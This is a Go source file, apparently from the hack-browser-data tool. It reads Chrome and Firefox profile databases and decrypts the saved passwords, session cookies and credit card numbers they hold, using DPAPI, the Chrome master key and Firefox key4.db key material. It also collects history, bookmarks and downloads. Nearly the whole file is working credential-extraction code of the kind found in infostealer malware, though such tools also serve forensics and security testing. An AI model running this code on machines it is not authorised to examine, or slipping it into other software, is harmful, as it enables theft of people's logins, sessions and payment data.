package hackbrowserdata

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"sort"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"

	"github.com/moond4rk/hack-browser-data/internal/decrypt"
	"github.com/moond4rk/hack-browser-data/internal/utils"
)

var (
	queryWebkitCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
	queryWebkitLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryWebkitHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	queryWebkitDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
	queryWebkitCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	queryGeckoHistory   = `SELECT id, url, last_visit_date, title, visit_count FROM moz_places where title not null`
	queryGeckoDownload  = `SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id`
	queryGeckoBookMarks = `SELECT id, url, type, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)`
	queryGeckoCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	queryMetaData       = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate     = `SELECT a11, a102 from nssPrivate`
	closeJournalMode    = `PRAGMA journal_mode=off`
)

type BrowsingData interface {
	// parse is used to get the browsing data
	// itermer is the required data type
	// masterKey is the decryption key stored in the system by the browser
	parse(itemer Itemer, masterKey []byte) error
}

type WebkitPassword []loginData

func (w *WebkitPassword) parse(itemer Itemer, masterKey []byte) error {
	loginDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer loginDB.Close()

	rows, err := loginDB.Query(queryWebkitLogin)
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			fmt.Println(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if len(pwd) > 0 {
			if masterKey == nil {
				password, err = decrypt.DPAPI(pwd)
				if err != nil {
					fmt.Println(err)
				}
			} else {
				password, err = decrypt.ChromePass(masterKey, pwd)
				if err != nil {
					fmt.Println(err)
				}
			}
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}
		login.Password = string(password)
		*w = append(*w, login)
	}
	sort.Slice(*w, func(i, j int) bool {
		return (*w)[i].CreateDate.After((*w)[j].CreateDate)
	})
	return nil
}

type WebkitCookie []cookie

func (w *WebkitCookie) parse(itemer Itemer, masterKey []byte) error {
	cookieDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer cookieDB.Close()
	rows, err := cookieDB.Query(queryWebkitCookie)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)
		if err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent); err != nil {
			fmt.Println(err)
		}

		cookie := cookie{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// TODO: replace DPAPI
		if len(encryptValue) > 0 {
			if masterKey == nil {
				value, err = decrypt.DPAPI(encryptValue)
				if err != nil {
					fmt.Println(err)
				}
			} else {
				value, err = decrypt.ChromePass(masterKey, encryptValue)
				if err != nil {
					fmt.Println(err)
				}
			}
		}
		cookie.Value = string(value)
		*w = append(*w, cookie)
	}
	sort.Slice(*w, func(i, j int) bool {
		return (*w)[i].CreateDate.After((*w)[j].CreateDate)
	})
	return nil
}

type WebkitBookmark []bookmark

func (w *WebkitBookmark) parse(itemer Itemer, masterKey []byte) error {
	bookmarks, err := utils.ReadFile(itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value, w)
			return true
		})
	}
	sort.Slice(*w, func(i, j int) bool {
		return (*w)[i].DateAdded.After((*w)[j].DateAdded)
	})
	return nil
}

func getBookmarkChildren(value gjson.Result, w *WebkitBookmark) (children gjson.Result) {
	const (
		bookmarkID       = "id"
		bookmarkAdded    = "date_added"
		bookmarkUrl      = "url"
		bookmarkName     = "name"
		bookmarkType     = "type"
		bookmarkChildren = "children"
	)
	nodeType := value.Get(bookmarkType)
	bm := bookmark{
		ID:        value.Get(bookmarkID).Int(),
		Name:      value.Get(bookmarkName).String(),
		URL:       value.Get(bookmarkUrl).String(),
		DateAdded: utils.TimeEpochFormat(value.Get(bookmarkAdded).Int()),
	}
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		bm.Type = nodeType.String()
		*w = append(*w, bm)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v, w)
			}
		}
	}
	return children
}

type WebkitHistory []history

func (w *WebkitHistory) parse(itemer Itemer, masterKey []byte) error {
	historyDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer historyDB.Close()
	rows, err := historyDB.Query(queryWebkitHistory)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		// TODO: handle rows error
		if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
			fmt.Println(err)
		}
		data := history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		*w = append(*w, data)
	}
	sort.Slice(*w, func(i, j int) bool {
		return (*w)[i].VisitCount > (*w)[j].VisitCount
	})
	return nil
}

type WebkitCreditCard []card

func (w *WebkitCreditCard) parse(itemer Itemer, masterKey []byte) error {
	creditDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer creditDB.Close()
	rows, err := creditDB.Query(queryWebkitCredit)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, month, year, guid string
			value, encryptValue     []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue); err != nil {
			fmt.Println(err)
		}
		creditCardInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
		}
		if masterKey == nil {
			value, err = decrypt.DPAPI(encryptValue)
			if err != nil {
				return err
			}
		} else {
			value, err = decrypt.ChromePass(masterKey, encryptValue)
			if err != nil {
				return err
			}
		}
		creditCardInfo.CardNumber = string(value)
		*w = append(*w, creditCardInfo)
	}
	return nil
}

type WebkitDownload []download

func (w *WebkitDownload) parse(itemer Itemer, masterKey []byte) error {
	historyDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer historyDB.Close()
	rows, err := historyDB.Query(queryWebkitDownload)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			targetPath, tabUrl, mimeType   string
			totalBytes, startTime, endTime int64
		)
		if err := rows.Scan(&targetPath, &tabUrl, &totalBytes, &startTime, &endTime, &mimeType); err != nil {
			fmt.Println(err)
		}
		data := download{
			TargetPath: targetPath,
			Url:        tabUrl,
			TotalBytes: totalBytes,
			StartTime:  utils.TimeEpochFormat(startTime),
			EndTime:    utils.TimeEpochFormat(endTime),
			MimeType:   mimeType,
		}
		*w = append(*w, data)
	}
	sort.Slice(*w, func(i, j int) bool {
		return (*w)[i].TotalBytes > (*w)[j].TotalBytes
	})
	return nil
}

type GeckoPassword []loginData

func (g *GeckoPassword) parse(itemer Itemer, masterKey []byte) error {
	p := strings.Split(itemer.FileName(Firefox), "|")
	loginsjson, key4db := p[0], p[1]
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey(key4db)
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	metaPBE, err := decrypt.NewASN1PBE(metaBytes)
	if err != nil {
		return err
	}
	// default master password is empty
	// TODO: use master password
	var masterPwd []byte
	k, err := metaPBE.Decrypt(globalSalt, masterPwd)
	if err != nil {
		return err
	}
	if bytes.Contains(k, []byte("password-check")) {
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nssPBE, err := decrypt.NewASN1PBE(nssA11)
			if err != nil {
				return err
			}
			finallyKey, err := nssPBE.Decrypt(globalSalt, masterPwd)
			finallyKey = finallyKey[:24]
			if err != nil {
				return err
			}
			allLogin, err := getFirefoxLoginData(loginsjson)
			if err != nil {
				return err
			}
			for _, v := range allLogin {
				userPBE, err := decrypt.NewASN1PBE(v.encryptUser)
				if err != nil {
					return err
				}
				pwdPBE, err := decrypt.NewASN1PBE(v.encryptPass)
				if err != nil {
					return err
				}
				user, err := userPBE.Decrypt(finallyKey, masterPwd)
				if err != nil {
					return err
				}
				pwd, err := pwdPBE.Decrypt(finallyKey, masterPwd)
				if err != nil {
					return err
				}
				*g = append(*g, loginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(decrypt.PKCS5UnPadding(user)),
					Password:   string(decrypt.PKCS5UnPadding(pwd)),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
	sort.Slice(*g, func(i, j int) bool {
		return (*g)[i].CreateDate.After((*g)[j].CreateDate)
	})
	return nil
}

func getFirefoxDecryptKey(key4file string) (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB *sql.DB
	)
	keyDB, err = sql.Open("sqlite3", key4file)
	if err != nil {
		return nil, nil, nil, nil, err
	}
	defer keyDB.Close()

	if err = keyDB.QueryRow(queryMetaData).Scan(&item1, &item2); err != nil {
		return nil, nil, nil, nil, err
	}

	if err = keyDB.QueryRow(queryNssPrivate).Scan(&a11, &a102); err != nil {
		return nil, nil, nil, nil, err
	}
	return item1, item2, a11, a102, nil
}

func getFirefoxLoginData(loginsjson string) (l []loginData, err error) {
	s, err := ioutil.ReadFile(loginsjson)
	if err != nil {
		return nil, err
	}
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m    loginData
				user []byte
				pass []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			user, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			if err != nil {
				return nil, err
			}
			pass, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			if err != nil {
				return nil, err
			}
			m.encryptUser = user
			m.encryptPass = pass
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return l, nil
}

type GeckoCookie []cookie

func (g *GeckoCookie) parse(itemer Itemer, masterKey []byte) error {
	cookieDB, err := sql.Open("sqlite3", itemer.FileName(Firefox))
	if err != nil {
		return err
	}
	defer cookieDB.Close()
	rows, err := cookieDB.Query(queryGeckoCookie)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		if err = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly); err != nil {
			fmt.Println(err)
		}
		*g = append(*g, cookie{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   utils.IntToBool(isSecure),
			IsHTTPOnly: utils.IntToBool(isHttpOnly),
			CreateDate: utils.TimeStampFormat(creationTime / 1000000),
			ExpireDate: utils.TimeStampFormat(expiry),
			Value:      value,
		})
	}
	return nil
}

type GeckoBookmark []bookmark

func (g *GeckoBookmark) parse(itemer Itemer, masterKey []byte) error {
	var (
		err          error
		keyDB        *sql.DB
		bookmarkRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", itemer.FileName(Firefox))
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	defer keyDB.Close()

	bookmarkRows, err = keyDB.Query(queryGeckoBookMarks)
	if err != nil {
		return err
	}
	defer bookmarkRows.Close()
	for bookmarkRows.Next() {
		var (
			id, bType, dateAdded int64
			title, url           string
		)
		if err = bookmarkRows.Scan(&id, &url, &bType, &dateAdded, &title); err != nil {
			fmt.Println(err)
		}
		*g = append(*g, bookmark{
			ID:        id,
			Name:      title,
			Type:      utils.BookMarkType(bType),
			URL:       url,
			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
		})
	}
	sort.Slice(*g, func(i, j int) bool {
		return (*g)[i].DateAdded.After((*g)[j].DateAdded)
	})
	return nil
}

type GeckoHistory []history

func (g *GeckoHistory) parse(itemer Itemer, masterKey []byte) error {
	var (
		err         error
		keyDB       *sql.DB
		historyRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", itemer.FileName(Firefox))
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		return err
	}
	defer keyDB.Close()
	historyRows, err = keyDB.Query(queryGeckoHistory)
	if err != nil {
		return err
	}
	defer historyRows.Close()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		if err = historyRows.Scan(&id, &url, &visitDate, &title, &visitCount); err != nil {
			fmt.Println(err)
		}
		*g = append(*g, history{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeStampFormat(visitDate / 1000000),
		})
	}
	sort.Slice(*g, func(i, j int) bool {
		return (*g)[i].VisitCount < (*g)[j].VisitCount
	})
	return nil
}

type GeckoDownload []download

func (g *GeckoDownload) parse(itemer Itemer, masterKey []byte) error {
	var (
		err          error
		keyDB        *sql.DB
		downloadRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", itemer.FileName(Firefox))
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		return err
	}
	defer keyDB.Close()
	downloadRows, err = keyDB.Query(queryGeckoDownload)
	if err != nil {
		return err
	}
	defer downloadRows.Close()
	for downloadRows.Next() {
		var (
			content, url       string
			placeID, dateAdded int64
		)
		if err = downloadRows.Scan(&placeID, &content, &url, &dateAdded); err != nil {
			fmt.Println(err)
		}
		contentList := strings.Split(content, ",{")
		if len(contentList) > 1 {
			path := contentList[0]
			json := "{" + contentList[1]
			endTime := gjson.Get(json, "endTime")
			fileSize := gjson.Get(json, "fileSize")
			*g = append(*g, download{
				TargetPath: path,
				Url:        url,
				TotalBytes: fileSize.Int(),
				StartTime:  utils.TimeStampFormat(dateAdded / 1000000),
				EndTime:    utils.TimeStampFormat(endTime.Int() / 1000),
			})
		}
	}
	sort.Slice(*g, func(i, j int) bool {
		return (*g)[i].TotalBytes < (*g)[j].TotalBytes
	})
	return nil
}

type (
	loginData struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmark struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookie struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
	download struct {
		TargetPath string
		Url        string
		TotalBytes int64
		StartTime  time.Time
		EndTime    time.Time
		MimeType   string
	}
	card struct {
		GUID            string
		Name            string
		ExpirationYear  string
		ExpirationMonth string
		CardNumber      string
	}
)
